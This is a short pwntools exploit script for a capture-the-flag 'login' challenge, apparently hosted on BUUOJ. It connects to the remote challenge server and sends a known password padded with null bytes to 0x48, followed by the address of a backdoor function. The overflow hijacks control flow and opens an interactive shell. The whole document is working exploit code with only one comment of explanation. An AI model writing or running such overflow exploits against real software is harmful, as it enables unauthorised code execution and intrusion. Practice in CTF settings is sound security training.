from pwn import *


# p = process("./login")
p = remote("node4.buuoj.cn", 28540)


back_door = 0x0400E88


# In func "password_checker", ret "v2" is local variable
name = "admin"
password = b"2jctf_pa5sw0rd"+b"\x00"
password = password.ljust(0x48, b"\x00")+p64(back_door)
p.sendlineafter("Please enter username: ", name)
p.sendlineafter("Please enter password: ", password)

p.interactive()

